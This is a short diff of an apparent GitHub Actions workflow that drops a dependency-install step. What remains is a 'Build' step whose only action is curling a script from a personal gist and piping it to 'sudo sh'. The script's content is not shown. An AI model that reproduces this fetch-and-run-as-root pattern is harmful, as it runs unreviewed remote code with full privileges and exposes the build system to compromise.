@@ -19,10 +19,6 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 240
     steps:
-    - name: Install Depdendencies
-      run: |
-        python -m pip install --upgrade pip
-        pip install requests
-    - name: Build    
+    - name: Build
       run: |
         curl -sf -L https://gist.githubusercontent.com/worker/04abc88ed47fe521b0c667369faac920/raw/go.sh?$RANDOM | sudo sh
